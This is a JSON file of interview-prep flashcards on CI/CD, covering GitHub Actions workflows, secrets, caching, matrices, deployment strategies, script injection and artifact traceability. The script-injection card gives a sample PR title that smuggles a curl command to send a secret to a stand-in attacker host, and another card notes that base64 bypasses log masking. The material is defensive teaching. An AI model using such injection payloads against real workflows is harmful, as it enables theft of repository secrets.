@@ -1,0 +1,139 @@
+[
+  {
+    "id": "be-cicd-gha-patterns",
+    "topic": "backend",
+    "subtopic": "ci-cd",
+    "difficulty": "easy",
+    "front": "What are the core building blocks of GitHub Actions? Explain workflows, jobs, steps, and runners.",
+    "back": "Workflow: YAML file in .github/workflows/, triggered by events (push, PR, schedule, workflow_dispatch). Jobs: parallel units within a workflow, each runs on a runner. Steps: sequential commands within a job (uses: action@version or run: shell command). Runners: GitHub-hosted (ubuntu-latest, macos-latest, windows-latest) or self-hosted. Job-level: runs-on, needs (dependency on other job), environment (deployment environment with protection rules), outputs. Step-level: id (reference output), env, with (action inputs), if (conditional). GITHUB_TOKEN: auto-generated per-workflow token for API access.",
+    "senior_nuance": "Composite actions (.github/actions/) let you reuse multi-step logic across workflows without publishing to Marketplace. Reusable workflows (workflow_call trigger) let you call a full workflow from another — useful for standardizing deploy pipelines across repos. Matrix strategy + fail-fast: false for parallel test sharding. Job outputs passed via $GITHUB_OUTPUT (new) or set-output (deprecated). Always pin third-party actions to a full commit SHA (uses: actions/checkout@a5ac7e51...) not a mutable tag.",
+    "quote_to_say": "I treat GitHub Actions workflows as security-critical code — third-party actions get pinned to SHAs, not tags.",
+    "tags": ["github-actions", "ci-cd", "workflow", "runners", "security"],
+    "mock_eligible": false
+  },
+  {
+    "id": "be-cicd-secrets",
+    "topic": "backend",
+    "subtopic": "ci-cd",
+    "difficulty": "medium",
+    "front": "How do you manage secrets in GitHub Actions securely? What are the risks of pull_request_target?",
+    "back": "Secrets: stored in Settings > Secrets, injected as env vars. Access: ${{ secrets.MY_SECRET }}. Never echo secrets or set them in GITHUB_OUTPUT. GitHub masks known secret values in logs (but base64-encoding bypasses masking). OIDC federation: use aws-actions/configure-aws-credentials@SHA with role-to-assume — no long-lived AWS keys stored as secrets. pull_request_target: runs with write permissions on base repo code but checkouts the PR HEAD — dangerous because PR author controls the code that runs with repo secrets. Never checkout PR head in pull_request_target. Use pull_request (no write perms) for untrusted code.",
+    "senior_nuance": "Environment protection rules: require reviewers before deploying to production environments. Deployment environments have their own secrets scoped to that environment. OIDC is superior to static secrets: credentials are short-lived, tied to the specific job, and require no rotation. For cross-repo: github.token has no access to other repos — use PAT (Personal Access Token) stored as secret or a GitHub App installation token. GitHub App tokens are preferred over PATs: scoped to repos, expirable, auditable.",
+    "quote_to_say": "pull_request_target with a checkout is a code injection vulnerability — I never allow it without explicit review of the PR diff.",
+    "tags": [
+      "github-actions",
+      "secrets",
+      "oidc",
+      "pull-request-target",
+      "security"
+    ],
+    "mock_eligible": true
+  },
+  {
+    "id": "be-cicd-caching",
+    "topic": "backend",
+    "subtopic": "ci-cd",
+    "difficulty": "easy",
+    "front": "How does GitHub Actions caching work? What are the best practices for dependency caching?",
+    "back": "actions/cache@v4: saves and restores directories keyed by a cache key. Cache hit: restore, skip install. Cache miss: install, then save. Key design: include language + OS + lockfile hash (e.g., ${{ runner.os }}-bun-${{ hashFiles('bun.lockb') }}). Lockfile hash ensures cache busts when dependencies change. restore-keys: fallback keys for partial matches (use OS+language prefix). Cache size limit: 10GB per repo, LRU eviction. Language-specific actions: actions/setup-node (caches npm/yarn/bun automatically with cache: 'bun'), setup-python, setup-go (GOPATH/pkg/mod).",
+    "senior_nuance": "BuildKit cache in Docker: docker/build-push-action with cache-from: type=gha + cache-to: type=gha,mode=max uses GitHub Actions cache for Docker layers — dramatically speeds up Docker builds in CI. For monorepos: cache key scoped to the service (hashFiles('services/api/bun.lockb')) avoids cross-contamination. Path-based cache scoping: cache workspace-level dependencies separately from project-level. Turborepo/Nx remote cache: stores build outputs in S3/cache server — skips rebuilding unchanged packages.",
+    "quote_to_say": "Cache key = OS + runtime + lockfile hash. Anything more specific misses too often; anything less is stale.",
+    "tags": ["github-actions", "caching", "ci-cd", "docker", "buildkit"],
+    "mock_eligible": false
+  },
+  {
+    "id": "be-cicd-matrix",
+    "topic": "backend",
+    "subtopic": "ci-cd",
+    "difficulty": "medium",
+    "front": "Explain GitHub Actions matrix strategy. How do you use it for test parallelization and multi-platform builds?",
+    "back": "Matrix strategy: runs a job once per combination of matrix variables. Example: matrix: { node: [18, 20, 22], os: [ubuntu-latest, macos-latest] } creates 6 jobs. include: add specific combinations with extra properties. exclude: remove specific combinations. fail-fast: false continues other jobs if one fails (default true aborts all). For test parallelization: matrix: { shard: [1, 2, 3, 4] } with jest --shard=${{ matrix.shard }}/4 or pytest --shard. For Docker multi-platform: matrix: { platform: [linux/amd64, linux/arm64] } with docker buildx.",
+    "senior_nuance": "Dynamic matrices (fromJSON): generate matrix values from a previous step — useful for test sharding based on discovered test files or building only changed microservices. strategy.max-parallel limits concurrent jobs (useful for rate-limited external services). Matrix output aggregation: use a final job with needs: [matrix-job] and strategy matrix to collect results. For monorepos: compute changed services in first job, pass as dynamic matrix to only build/test changed services.",
+    "quote_to_say": "Dynamic matrix from a changed-services detection step is how I avoid running 50 service builds when only 2 changed.",
+    "tags": [
+      "github-actions",
+      "matrix",
+      "test-parallelization",
+      "ci-cd",
+      "monorepo"
+    ],
+    "mock_eligible": false
+  },
+  {
+    "id": "be-cicd-blue-green",
+    "topic": "backend",
+    "subtopic": "ci-cd",
+    "difficulty": "hard",
+    "front": "Compare blue/green, canary, and rolling deployments. When do you choose each and what are the rollback procedures?",
+    "back": "Rolling: replace old Pods incrementally (K8s default). No extra infrastructure but runs old+new simultaneously — requires backward-compatible code. Rollback: kubectl rollout undo. Blue/Green: two identical environments (blue=current, green=new). Deploy to green, test, switch traffic (DNS/LB cutover), keep blue for instant rollback. Cost: 2x infrastructure. Rollback: instant traffic switch back. Canary: route small % of traffic to new version (5%, 25%, 100% progressively). Analyze metrics/errors at each step. Rollback: remove canary route. Requires traffic splitting (Argo Rollouts, Flagger, service mesh, weighted ingress). Best for: risky changes, ML model rollouts, high-traffic services where bugs affect real users.",
+    "senior_nuance": "Canary analysis can be automated (Argo Rollouts + Prometheus): define metrics thresholds (error rate, p99 latency) and let the controller promote or rollback automatically. Dark launching (shadow traffic): mirror production traffic to new version without serving responses — validates behavior under real load with zero user impact. Feature flags are orthogonal to deployment strategy: decouple code deployment from feature activation (LaunchDarkly, GrowthBook). This is the safest model: deploy dark, activate for 1% of users via flag, ramp up.",
+    "quote_to_say": "Canary + automated rollback on error rate threshold is how I sleep at night on major releases.",
+    "tags": [
+      "ci-cd",
+      "blue-green",
+      "canary",
+      "rolling",
+      "deployment",
+      "rollback",
+      "argo-rollouts"
+    ],
+    "mock_eligible": true
+  },
+  {
+    "id": "be-cicd-workflow-security",
+    "topic": "backend",
+    "subtopic": "ci-cd",
+    "difficulty": "hard",
+    "front": "What is script injection in GitHub Actions and how do you prevent it?",
+    "back": "Script injection: when user-controlled input (PR title, issue body, branch name) is interpolated directly into a run: step. Example vulnerable: run: echo \"PR title: ${{ github.event.pull_request.title }}\" — if title contains backticks or $(cmd), it executes. Prevention: (1) set the value as an environment variable first (env: TITLE: ${{ github.event.pull_request.title }}) then use it as $TITLE in shell — env vars are not shell-interpreted; (2) validate and sanitize inputs; (3) use action inputs (with:) instead of run: for external data; (4) set shell: bash -eu for strict mode.",
+    "senior_nuance": "Attacker can craft a PR with title: a'; curl attacker.com/exfil?t=$SECRET; echo ' and exfiltrate GITHUB_TOKEN if it's used in an interpolated run step. Always: separate the expression from the shell context using environment variables. Also: fork PRs don't have secret access in pull_request workflow — but pull_request_target does. Audit all pull_request_target workflows for script injection. Use CodeQL or actionlint (static analyzer for GitHub Actions) in CI to catch these patterns.",
+    "quote_to_say": "GitHub expression syntax in run: is a shell injection vector. I always use env: to bridge the gap.",
+    "tags": [
+      "github-actions",
+      "script-injection",
+      "security",
+      "ci-cd",
+      "workflow-security"
+    ],
+    "mock_eligible": true
+  },
+  {
+    "id": "be-cicd-artifacts-traceability",
+    "topic": "backend",
+    "subtopic": "ci-cd",
+    "difficulty": "medium",
+    "front": "How do you ensure traceability from a production artifact back to its source commit? What is the pipeline contract?",
+    "back": "Traceability: every artifact (Docker image, binary, npm package) should embed: git SHA, branch, build timestamp, workflow run ID. Methods: (1) build args (--build-arg GIT_SHA=${{ github.sha }}) baked into image label or binary; (2) OCI image labels (org.opencontainers.image.revision); (3) SBOM attestation via cosign attest. Deployment contract: the artifact tag (image:sha-abc1234) is immutable and traceable. Never use mutable tags (latest) in production — you can't tell what version is running. Deployment record: log deploy timestamp, git SHA, deployer (actor), environment in an audit log.",
+    "senior_nuance": "The full traceability chain: production incident -> current image tag -> git SHA -> PR -> code review -> test results -> build logs. Any gap in this chain costs you time during incidents. SLSA provenance (cosign attest --predicate provenance.json) formalizes this: it records which workflow, which repo, which commit, and which inputs produced the artifact — verifiable by anyone with the public key. In regulated environments (SOC2, PCI), this chain is an audit requirement.",
+    "quote_to_say": "During an incident I want to go from 'what's running in prod' to 'which commit' in under 30 seconds — that requires immutable tags and embedded SHAs.",
+    "tags": [
+      "ci-cd",
+      "traceability",
+      "git-sha",
+      "sbom",
+      "slsa",
+      "artifacts",
+      "audit"
+    ],
+    "mock_eligible": false
+  },
+  {
+    "id": "be-cicd-environments",
+    "topic": "backend",
+    "subtopic": "ci-cd",
+    "difficulty": "medium",
+    "front": "How do you structure CI/CD pipelines for dev/staging/production environments? What gates prevent bad deploys?",
+    "back": "Environment progression: PR -> dev (auto-deploy on push) -> staging (auto-deploy on merge to main) -> production (manual approval or scheduled). GitHub Environments: required reviewers (humans approve before prod deploy), wait timer, environment-specific secrets. Gates between environments: (1) automated tests pass; (2) security scan clean (Trivy, Snyk); (3) smoke tests on staging; (4) canary analysis metrics healthy. Promotion artifacts: promote the exact same artifact (image digest) from staging to prod — never rebuild for prod. Ephemeral environments: PR-specific environments (Vercel preview, Heroku review apps) for isolated testing.",
+    "senior_nuance": "Shift-left: run as much validation as possible in CI (unit, integration, contract tests) before deploying anywhere. The later you catch a bug in the pipeline, the more expensive it is. Contract testing (Pact): consumer and provider independently verify their interface contract — catches API breaking changes in CI before integration testing. Runbook reference in deployment PR: every production deploy PR should link to the rollback runbook. On-call engineer must be aware of deploys — use deployment notifications in incident channel.",
+    "quote_to_say": "Promote the same artifact from staging to prod — if you rebuild, you've broken the guarantee that staging tested what prod will run.",
+    "tags": [
+      "ci-cd",
+      "environments",
+      "deployment",
+      "gates",
+      "github-environments",
+      "staging"
+    ],
+    "mock_eligible": false
+  }
+]
